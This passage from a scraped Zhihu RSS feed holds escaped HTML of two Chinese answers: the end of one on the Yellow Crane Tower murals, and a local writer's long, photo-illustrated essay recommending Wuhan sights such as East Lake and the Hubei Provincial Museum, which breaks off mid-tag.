data-private-watermark-src=\"v2-43dddb3072197607ed023f4909386b6d\"></p>\n<p><br></p>\n<p><b>《浪淘沙》</b></p>\n<p>中间最大幅壁画，以传统的孔雀石研制的石绿为基调，泼洒到巨大的墙面上，配合石青浓淡墨色、暖色使画面具有经过自然风化的青铜器的感觉。</p>\n<p>再用金勾勒出长江的涡漩激流，以一泻万里磅礴气势作为华夏民族历尽艰辛而百折不挠的精神写照。</p>\n<p><br></p>\n<p>/</p>\n<p><br></p>\n<p>接下来看的，是一组环绕大厅的7幅壁画《长江源流》，每段壁画由圆柱分割，表现了哺育着文化历史与思想的万里长江。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-06b3ac12afefb3ed3b44f24dd33ce2e0_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"974\" data-rawheight=\"852\" data-watermark=\"original\" data-original-src=\"v2-06b3ac12afefb3ed3b44f24dd33ce2e0\" data-watermark-src=\"v2-797fd4c5ed71969b2ef9911cfd43f36e\" data-private-watermark-src=\"v2-652a1b4f33386424aa2e738edb5c4e01\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-b873aa2c43260361f41e499e66166bb2_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2480\" data-watermark=\"original\" data-original-src=\"v2-b873aa2c43260361f41e499e66166bb2\" data-watermark-src=\"v2-10fd7a488e00b1129b0421c53489a612\" data-private-watermark-src=\"v2-c1762d9890a49153478b294ba86555f0\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c7406feb59fae3528de6ad3cf7d6eb97_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2346\" data-watermark=\"original\" data-original-src=\"v2-c7406feb59fae3528de6ad3cf7d6eb97\" data-watermark-src=\"v2-18206917498119b2b4e56b46058c531a\" data-private-watermark-src=\"v2-1d8fd294eb284a1b3aaf692bb5822121\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-1f80a249ec71b16d77246bc546b73924_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"3659\" data-watermark=\"original\" data-original-src=\"v2-1f80a249ec71b16d77246bc546b73924\" data-watermark-src=\"v2-0b85edadc8edad050ea8cec20526e1e5\" data-private-watermark-src=\"v2-4c1ad16e2e0ddca15b3f6e150bfeb94e\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d49e58347ce649e19ca21b1e09fdb17b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"3609\" data-watermark=\"original\" data-original-src=\"v2-d49e58347ce649e19ca21b1e09fdb17b\" data-watermark-src=\"v2-84f5d5fd4054282e8b78652a7051028b\" data-private-watermark-src=\"v2-a453ba77e278960be96daaf9381aba77\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-6248c8c1fb2c38e0b8401c2e23939abb_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2310\" data-watermark=\"original\" data-original-src=\"v2-6248c8c1fb2c38e0b8401c2e23939abb\" data-watermark-src=\"v2-70752ece54113bf8d24363318cef1764\" data-private-watermark-src=\"v2-621b73529e7b46f25072d75cdd56ecac\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ffdba8878d6fbf5a6b451839fbb18e2d_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"2328\" data-watermark=\"original\" data-original-src=\"v2-ffdba8878d6fbf5a6b451839fbb18e2d\" data-watermark-src=\"v2-62e895336e07260d7b0f04f91aaff91d\" data-private-watermark-src=\"v2-99e0654a3a9e71644f908e708818459f\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-45b064ea70f8f6c6a5c6a69cbf34f7b7_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"985\" data-rawheight=\"3734\" data-watermark=\"original\" data-original-src=\"v2-45b064ea70f8f6c6a5c6a69cbf34f7b7\" data-watermark-src=\"v2-39754d0d214ff1e5bccb43f536a2d901\" data-private-watermark-src=\"v2-ede985e9d14d414acb69e95657fbf86c\"></p>\n<p><br></p>\n<p><b>/</b></p>\n<p><br></p>\n<p>每一幅画都不是独立的，如果心细，可以发现很多呼应的地方。</p>\n<p>比如静美的采桑女和与海浪搏斗的船夫，比如红色的山头在两幅对立画中的呼应，比如前三幅一直连接的长江水……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-f0eaf3402818cd8115041e9e00d9a1db_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-f0eaf3402818cd8115041e9e00d9a1db\" data-watermark-src=\"v2-c022bab8097a8c22ade4149e997552ac\" data-private-watermark-src=\"v2-0dbdc8f26720277e1f4d5611b8a974a9\"></p>\n<p><br></p>\n<p>楼先生强调了他对艺术创作的态度，一定要“中化洋”，而不是“洋化中”，要留住自己文化的东西。</p>\n<p>纵观这组壁画，与黄鹤楼在建筑和历史文化上都很好融为一体，展现了中国壁画和中华文明的风采。</p>\n<p>但正如楼先生说，“这画不是句号，是逗号。”希望每个前来观看壁画的人，能够有自己的见解，壁画完成之后，它的生命就是被读者所延续。</p>\n<p><b>9 月 13 日，黄鹤楼第五层的壁画重新对外开放，欢迎你来看。</b></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-a099d355ba0ea009092f4d2651ca4940_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-a099d355ba0ea009092f4d2651ca4940\" data-watermark-src=\"v2-4f2a9dae97fc0505fb0662395e4b83a2\" data-private-watermark-src=\"v2-fa504b6d029d6fbe444fc2d8c7d59655\"></p>\n<p>*以上内容均为我司原创，并非抄袭，特此说明。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/hansyi-sheng-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">HANS汉声</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/463692637/answer/2133068485?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">217 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/485890062?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">武汉黄鹤楼背后有什么「不为人知」的故事？</a><br><a href=\"http://www.zhihu.com/question/337570929?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去湖北武汉的「黄鹤楼」有哪些实用的攻略和好的建议？</a><br>\n","link":"http://www.zhihu.com/question/463692637/answer/2133068485?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"武汉有哪些著名景点值得推荐呢？","date":"2021-09-24 08:26:29","description":"\n<p>留几个字这里，有时间一定回答这个问题。</p>\n<p>上面一句是我好多天前敲的字。的确想回答一下这个问题。</p>\n<p>声明一下：文章有点长！追求短平快的，看到这里请放弃，网上另去搜索！别从头到尾读完了然后下面不礼貌评论。我可没拉着谁，请尊重我的劳动！</p>\n<p>旅游是我人生最爱，超过写作、读书、追剧、购物、聚会和美食……实际上旅游包括很多人人生爱好的一切，诸如吃喝玩乐衣食住行都可以涵括到“旅游”之内。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-eb10876fed40ae20b043f846a37828f6_720w.jpg?rss\" data-rawwidth=\"899\" data-rawheight=\"899\" data-size=\"normal\" data-caption=\"胡榴明在旅游途中——摄影黄樱子\" data-watermark=\"watermark\" data-original-src=\"v2-eb10876fed40ae20b043f846a37828f6\" data-watermark-src=\"v2-1e4e5fd82ed19a2faf313ba76a871396\" data-private-watermark-src=\"v2-d7ba4aa2eb6a08694e6d4ac3dcda199f\"></p>\n<p>外出旅游或旅行，第一奔景点，然后才是其他。没有好的自然风景古迹名胜吸引不了前来游玩的人。所以我们在选定了旅行目的地后接下来想要知道的就是当地最值得一游的景点，这样可以在有限的时间内力所能及玩得开心。所以有人上知乎提问并邀请人回答，尤其想听当地人的意见。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7b9863afa3168aae49bab82fef8d600e_720w.jpg?rss\" data-rawwidth=\"1920\" data-rawheight=\"2560\" data-size=\"normal\" data-caption=\"武汉二七长江大桥——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-7b9863afa3168aae49bab82fef8d600e\" data-watermark-src=\"v2-713b8879e48cef3cd20f527c42552043\" data-private-watermark-src=\"v2-aa2d1fbd019cd51e6d34ecb462155095\"></p>\n<p>一、节省自己上网攻略的时间和精力；二、获得较为可靠的信息免得前往景点吃（不必要的）亏——跑一个景点花了钱和力气觉得不值自然会有\"吃亏”的感觉，同为旅游（旅行）达人，这样心态我理解并深有感受。</p>\n<p>很高兴被邀请回答想来或准备来武汉旅游的人最关注的问题：武汉有哪些著名景点值得推荐的？</p>\n<p>多年前外地人来武汉，多数工作出差，然后顺带玩一下，专程为旅游来武汉的人很少，不拿武汉当旅游城。武汉本地人也一样，不以这样“形象”包装自己。(当年)不屑！包括我。</p>\n<p>从很小起，我一直想跑出武汉到别的地方去玩，从来不觉得自己生长的城市有什么好玩的。后来人长大了年纪老了，跑的地方多了，回过头来一想：武汉挺好！</p>\n<p><img src=\"https://pic2.zhimg.com/v2-59b20c7fa88421ef79711db5396cb4e8_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"长江武汉一段——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-59b20c7fa88421ef79711db5396cb4e8\" data-watermark-src=\"v2-62fc0ae1a8cb223b1e5bd254423ba766\" data-private-watermark-src=\"v2-108a7ddbea8ffeced4497c13f847018e\"></p>\n<p>真不是“谁不说咱家乡好”。好就是好！不跟谁比。每一城市、每一风景旅游区，各有各的优点，各有各特别之处。要不然旅行者干嘛一年到头天南海北换着地方跑呢？</p>\n<p>去年十一去长沙，五一广场过去几条街人满为患，出租车路上堵得啊！司机蛮自豪：“网红城嘛！”听着心里挺疙瘩但不得不服气。谁叫咱武汉城市形象宣传力度没人家大没人家会呢！</p>\n<p>感想几句，下面回正题：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-f57f0d263bfbdf713aefa3a431088ff4_720w.jpg?rss\" data-rawwidth=\"4752\" data-rawheight=\"3168\" data-size=\"normal\" data-caption=\"万里长江第一桥武汉长江一桥1957年建——摄影胡西雷。\" data-watermark=\"watermark\" data-original-src=\"v2-f57f0d263bfbdf713aefa3a431088ff4\" data-watermark-src=\"v2-86c5ed678ac06202a90c2f6006525608\" data-private-watermark-src=\"v2-71600449c1404f87ff121d40d572853e\"></p>\n<p>近十年来武汉城市整体面貌大改观：城市规划、城市建设、城市建筑、城市交通发展可以用“日新月异”来形容。住城市中心区的我如果有几个月没有到另一个城区去，再去那天周遭风景变得不认识：一条一条地铁线开通，一道一道高架修起，一个一个城区楼房高耸，长江上新建大桥一座接一座，园林绿化地一片接一片，商业、娱乐、休闲，室内外场地从老城区延展到新城区，星罗棋布，每逢周末和节假日车水马龙、人潮汹涌……</p>\n<p><img src=\"https://pic4.zhimg.com/v2-268dea3fd8bca6bdecb794939851ab8d_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"武汉二环，下班路上，前方二七长江大桥——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-268dea3fd8bca6bdecb794939851ab8d\" data-watermark-src=\"v2-ad0ed18730a030e66550f8f022b80b8d\" data-private-watermark-src=\"v2-5ec4c7147665fcb4d8c592015c1cc9aa\"></p>\n<p>特别是三镇餐饮业，价格便宜且美味。不来不知道，不比不知道（武汉小吃，比同规模城市的确便宜很多）——链接一个我的知乎文推介一下，就不重复了。美食感兴趣的朋友点开下面链接。</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/question/453229200/answer/1833906473\" data-image=\"https://pic4.zhimg.com/v2-95337415f309fe5506afc6e94ea13108_qhd.jpg\" data-image-width=\"1920\" data-image-height=\"1080\" class=\"internal\">除了热干面，你认为最能代表武汉的食物还有什么？</a><p>这篇文章主要介绍武汉传统小吃，其他诸如时尚餐饮业（国内川菜、湘菜、粤菜……国外日餐、韩餐，意大利餐、法兰西餐、美式快餐、巴西烧烤……）在武汉也非常兴旺。不属本答题主旨，</p>\n<p>业界人士都知道武汉旅游景点排行榜，“几菜一汤”，吐槽“老一套”。吐槽归吐槽，黄鹤楼、归元寺、宝通寺、长春观，东湖，所以名列前茅，必然有它的道理。如故宫之于北京，外滩之于上海，杜甫草堂之于成都，拙政园之于苏州，西湖之于杭州，“小蛮腰”之于广州，陕西博物馆之于西安，解放碑之于重庆……都属第一次去这个城市非去不可的景点。武汉几处著名景点也一样。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-16385bc059d96604ad466d787c47ea5c_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1440\" data-size=\"normal\" data-caption=\"长江流经武汉，波涛汹涌、波澜壮阔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-16385bc059d96604ad466d787c47ea5c\" data-watermark-src=\"v2-dc6b02dd8f12a28a215b504642eebc57\" data-private-watermark-src=\"v2-8f317e7648b0fda0e514ae5518fac540\"></p>\n<p>强调一下：没和武汉旅游业界有合作，没拿任何景区一分钱。来知乎回答这个问题，因为《知乎·武汉》对我的信任，希望有武汉城市学研究者参与对武汉城市文化讲述。作为武汉本土文人，我“义不容辞”。下面文字公益写作，喜欢的网友，就，看文吧。</p>\n<p><b>一、东湖</b></p>\n<p>第一次来武汉的人一定要游东湖。城中湖，大而美！</p>\n<p>摘录我写东湖的散文其中几个小段落。</p>\n<h3><b>碧水蓝天武汉东湖</b></h3>\n<p>有一年去杭州，绕着西湖转了一圈。两相比较，觉得还是我们武汉的东湖好。</p>\n<p>东湖位于古武昌东郊，由郭郑湖、水果湖、喻家湖、汤湖、牛巢湖五个湖泊组成的一个自然湖，南与沙湖贯通，经青山港注入长江，江河湖海相通，古云梦泽留下的一泓活水，千年万年不断绝的水的源头。</p>\n<p>20世纪末，城市建设兴起，市区向郊区扩展，东湖早已划归武昌城市圈以内，景区面积81.68平方公里，湖区面积33平方公里，杭州西湖的六倍，中国最大的城中湖。</p>\n<p>(注：武汉市扩大城区，汤逊湖划入版图，现在东湖应为中国第二大人工湖）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-afb72d485b69a10fe39fa9d9ce1f5bcd_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖磨山楚城——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-afb72d485b69a10fe39fa9d9ce1f5bcd\" data-watermark-src=\"v2-1e65d860ca6fff4c0d6c63ef75dc19f8\" data-private-watermark-src=\"v2-afc39302e4c35cddd65fe4b2c8c76408\"></p>\n<p>地图上看，东湖在武汉市，长江南岸，武昌东北部，上窄下宽，一个巨大的三角形，水域阔大，水岸线绵长，呈“∪”形凸凹曲折，民间传说有“九十九湾”，其实不止，湖区岬湾一共 120处，天然的半岛和港湾，沿湖岸陆地地貌复杂多样，丘陵、谷地、平野，高低错落，间杂其间；湖水深广，水质优良，出产丰富，莲藕和鱼类东湖特产。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-42b82f71d3c2f548c8976141e658f09e_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖听涛区——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-42b82f71d3c2f548c8976141e658f09e\" data-watermark-src=\"v2-6c789a3149f2b1d98cde997ef476f98d\" data-private-watermark-src=\"v2-730adbf4d82034637b74f4b2c3750914\"></p>\n<p>东湖的开发自20世纪三十年代始。银行家周苍柏在东湖南端买下一大块荒地沼泽，取名“海光农圃”，种植树木，挖掘池塘，修筑道路和堤岸。1949年后，周先生将辛苦经营多年的私家园林捐赠给国家，后来东湖的“雏形”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-0d08641f9ee0ec7f7f45ca743f0bff6f_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖每一片湖区夏季荷花盛开——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-0d08641f9ee0ec7f7f45ca743f0bff6f\" data-watermark-src=\"v2-9e41f0587da915c4f195ee6810eb044b\" data-private-watermark-src=\"v2-449546987a565663578ea84d15d477af\"></p>\n<p>站在伸向湖水的岸边一角，隔万顷碧波，对岸是青若屏障的珞珈山，武汉大学翠绿的琉璃瓦顶太阳下隐约闪光……身边不远有人钓鱼，朝湖上甩出长长的丝绳；松林很静，有几只灰色羽毛的喜鹊拖着长尾飞过。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7aece6cca8445474468da1ba60c21a5e_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"湖畔柳——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-7aece6cca8445474468da1ba60c21a5e\" data-watermark-src=\"v2-193ad6ed844660004513687a814394f8\" data-private-watermark-src=\"v2-4ba52147ef2a9c757bb0df7bc3caef73\"></p>\n<p>东湖，水域辽阔，地貌复杂，东南西北，四面八方，水上岸上，风景各异，分为“听涛”、“磨山”、“落雁”、“白马”、“珞洪”、“吹笛”六大风景区。</p>\n<p>去东湖玩，走黄鹂湾，东湖宾馆建在湖边山坡上，朝里走，沿湖数里湖区深处，长长一条湖心路走进一处大花园，这就是著名的梅岭。枝繁叶茂的大树间几栋式样朴素的楼房，明亮的玻璃窗向湖面，梅岭1号、梅岭3号、梅岭5号和南山甲所，环境幽静，格调典雅，远处湖光山色，近旁花木森森……20年世纪末对外开放。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-d39efeb3184d0d80cc85ae82ae349e15_720w.jpg?rss\" data-rawwidth=\"720\" data-rawheight=\"540\" data-size=\"normal\" data-caption=\"东湖一小部分，东湖宾馆和梅岭，我认为是东湖最美一部分——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-d39efeb3184d0d80cc85ae82ae349e15\" data-watermark-src=\"v2-e2aae98474c71d26a334c75af1f164ad\" data-private-watermark-src=\"v2-48d94f87a85e146c758be91a55ccb2e9\"></p>\n<p>黄鹂湾东湖景区大门进去是听涛区，隔着遥遥地看见一大片湖水，湖畔长长一排柳树，春天的柳树芽是嫩嫩的金色，夏天的柳树叶片长长的如同美人的眉毛，柳树枝条柔韧绵长地垂到湖面，湖水漾起一圈圈涟漪。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-6b287a230c824d244e8d1a5668c713a8_720w.jpg?rss\" data-rawwidth=\"3648\" data-rawheight=\"2736\" data-size=\"normal\" data-caption=\"东湖梅岭南山甲所——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-6b287a230c824d244e8d1a5668c713a8\" data-watermark-src=\"v2-b5db00813aa1d33a08534dd52201f1fe\" data-private-watermark-src=\"v2-e7ee0df665bb15c820f768972bc5f7d8\"></p>\n<p>顺着湖岸走，行吟阁、屈原纪念馆、橘颂亭，茂林修竹的深处，翠甍飞檐，素墙灰瓦，清幽静寂的蜃楼仙境。</p>\n<p>今天的武昌，战国时名鄂渚，楚国属地，相传楚大夫屈原被楚顷襄王放逐经行于此。</p>\n<p>“乘鄂渚而反顾兮，欸秋冬之绪风，步余马兮山皋，邸余车兮方林……”（屈原《涉江》）</p>\n<p>行吟阁位于东湖西北岸中部的小岛上，四面环水，荷风、落羽两道白石桥和陆地相连，三层四角攒尖顶古典楼阁，阁楼前立着白石雕塑屈原像。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-587347e3fcab31848bc7dd558751b8c3_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"行吟阁屈原纪念馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-587347e3fcab31848bc7dd558751b8c3\" data-watermark-src=\"v2-270d87a65c75e7167a8cc73aa09c3069\" data-private-watermark-src=\"v2-40aac0281caef16d3f74e05ffbc4d849\"></p>\n<p>长天楼，取唐代诗人王勃辞赋一句：“秋水共长天一色”，情致和意境都非常吻合。绿瓦白墙，翘脊飞拱，镂空花窗，左右空廊向两端伸展，楼上楼下，最适合观赏湖上风景，视野开阔，纵览无余，水天一色、天水无际，气魄宏大如一片海。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-5c49dda311d2415c1e1455fca46ec369_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"湖面太浩大，如果镜头仅对湖，照片上一片茫茫碧水，感觉不到风景，其实就是风景——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-5c49dda311d2415c1e1455fca46ec369\" data-watermark-src=\"v2-b93c8a065f5fb69ed5667bae3f49daeb\" data-private-watermark-src=\"v2-d1c84c249cf1e35290dcee9d7926b894\"></p>\n<p>往北，梨园，秋天果树飘香的季节来这里最好，每年菊花展也选在园内举行，粗壮的大树，青翠的竹林，还有春天开花夏秋结果的桃树和李树，园子里有石路，树阴下有石凳，花香和鸟语，浅草和平湖……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2247b0ca3983202fb90e042cff662058_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"湖畔——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2247b0ca3983202fb90e042cff662058\" data-watermark-src=\"v2-a6aa2a267e548a551e325b3fae1730c2\" data-private-watermark-src=\"v2-0b7ad560d9e27932a4ce0754703b9a52\"></p>\n<p>有木船过对岸，早先有船娘摇船（现在有没有不清楚），两根木桨长长交叉划水，水在身下极清，透明如玻璃，伸手进湖水，水草碧绒绒的如女人的长发；阳光从天上射下来，湖上波光动摇，片片如金鳞。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-952640ceea0b8a87dfde48f845b7584c_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖磨山，游客必游之地——摄影胡西雷（我和弟弟胡西雷拍摄武汉三镇建筑风景将近20年）\" data-watermark=\"watermark\" data-original-src=\"v2-952640ceea0b8a87dfde48f845b7584c\" data-watermark-src=\"v2-0ef67a834484fa91b9c7cb9c78cd97a8\" data-private-watermark-src=\"v2-bf6de14f71c224bb0eb0859401edf8e8\"></p>\n<p>冬天赏雪去东湖钓鱼台，脚下石台如方舟浮动在湖面，雪花飘飘从天而降，身内身外皆是琼楼玉宇。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2c90f93a7aff76bb75de9b6304ffa876_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"东湖钓鱼台——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2c90f93a7aff76bb75de9b6304ffa876\" data-watermark-src=\"v2-d77d27f92d01f02f040062041770c663\" data-private-watermark-src=\"v2-c40fe68bd713d8f25acc124f97f5c080\"></p>\n<p>磨山植物园，面积70公顷，全园共建有珍稀植物区、观赏植物区、水生植物区、药用植物区、猕猴桃园、松柏园、树木园、竹园等十多个专类园区和园林景区，引进各类植物近4000种，是我国华中地区最大的植物资源收藏中心和中国北亚热带植物研究保护基地。其中有中国最大的梅园，面积800余亩，一万株梅树，301个梅花品种。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2de4cd069635ae87df73076de8995ae6_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"磨山植物园内经心书院——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-2de4cd069635ae87df73076de8995ae6\" data-watermark-src=\"v2-4366a688e202b8918bb1f653c4e68b7b\" data-private-watermark-src=\"v2-e651cdf4fe778054f8615bf7dc31ca44\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-52ea66d0110b40e13608494c3f22bdef_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"磨山梅园——摄影胡榴明（我去的季节不是梅花开放的季节，以后有机会补拍）\" data-watermark=\"watermark\" data-original-src=\"v2-52ea66d0110b40e13608494c3f22bdef\" data-watermark-src=\"v2-9c2cab20a24183505edc411b32150a3f\" data-private-watermark-src=\"v2-14b9cbb26753f3acfe1783eaace61bbe\"></p>\n<p>乘缆车登磨山顶，金辉灿烂的楚天台上耸立1.2米高铜凤——凤鸟 长江流域楚文化图腾，与黄河流域龙文化遥相呼应，云梦大泽中出生的太阳鸟……</p>\n<p><img src=\"https://pic3.zhimg.com/v2-38301733fab1959c4ba0be17c92f718d_720w.jpg?rss\" data-rawwidth=\"1056\" data-rawheight=\"797\" data-size=\"normal\" data-caption=\"东湖磨山楚城铜雕凤鸟是楚文化图腾——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-38301733fab1959c4ba0be17c92f718d\" data-watermark-src=\"v2-7f9fbb6bffd9f8a0d83891f4704350c2\" data-private-watermark-src=\"v2-bbf778a9d886cddfe803d5efa62f1072\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-afb72d485b69a10fe39fa9d9ce1f5bcd_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"磨山楚城，仿春秋楚国都城郢都(纪南城）出土陶塑城楼模型比例扩大建造，有一定古文化观摩价值，城内有楚街等仿古文化雕塑群及自然风景区，规模很大——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-afb72d485b69a10fe39fa9d9ce1f5bcd\" data-watermark-src=\"v2-1e65d860ca6fff4c0d6c63ef75dc19f8\" data-private-watermark-src=\"v2-afc39302e4c35cddd65fe4b2c8c76408\"></p>\n<p>朱碑亭（朱德亲笔题字石碑）内看东湖，湖面更阔，湖水更碧，湖光山色没入天的那一边，心灵神思飞向很远很远。</p>\n<p>行在湖边，浮在湖上，荡漾在湖水之间，烟水迷茫处，让你沉醉得找不到自己。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-108cb77f425973ba568a47e332e5aaff_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1944\" data-size=\"normal\" data-caption=\"远眺东湖湖山相映衬——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-108cb77f425973ba568a47e332e5aaff\" data-watermark-src=\"v2-8068781d87f4e4cc9abcd60f8f1021a5\" data-private-watermark-src=\"v2-735e2c954360f260795b9831160e6fde\"></p>\n<p>湖北博物馆坐落在东湖之滨，乌红瓦顶，朱红窗櫺，粗犷的石头门柱，光滑的石头廊台，取楚国宫殿建筑格局，占地6.4公顷，有中国大陆规模最宏大、门类最齐全、功能最完备的古乐器陈列馆。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-441324b19c4bfb2b5d26fe4e818b735e_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"黄樱子在东湖畔湖北省博物馆——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-441324b19c4bfb2b5d26fe4e818b735e\" data-watermark-src=\"v2-0d512897028b63f5513c38124aae4ee5\" data-private-watermark-src=\"v2-d5837797a93162689cc3d5c2523d0685\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-14d86d6f0a6d39cc653b233a9723b600_720w.jpg?rss\" data-rawwidth=\"3072\" data-rawheight=\"2304\" data-size=\"normal\" data-caption=\"湖北省博物馆曾侯乙编钟（部分）世界瑰宝——摄影胡榴明\" data-watermark=\"watermark\" data-original-src=\"v2-14d86d6f0a6d39cc653b233a9723b600\" data-watermark-src=\"v2-1083b017bf537e12cb0c538594d79664\" data-private-watermark-src=\"v2-fa864ff4d6194a4c6da362de0be33c34\"></p>\n<p>曾侯乙墓出土战国时期巨型青铜编钟器群、曾侯乙墓出土战国时期的青铜编磬、越王勾践青铜剑、黄陂盘龙城出土商代大玉戈、战国时期虎座鸟架鼓……“物华天宝、人杰地灵”，每一寸土下都有珍藏，20万件举世瞩目的珍品。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9a48283cb31f58c0e0a228b30c331ecc_720w.jpg?rss\" data-rawwidth=\"2590\" data-rawheight=\"1567\" data-size=\"normal\" data-caption=\"东湖磨山女娲石雕——摄影胡西雷\" data-watermark=\"watermark\" data-original-src=\"v2-9a48283cb31f58c0e0a228b30c331ecc\" data-watermark-src=\"v2-23131ead751a24be302a7f60ff1130ad\" 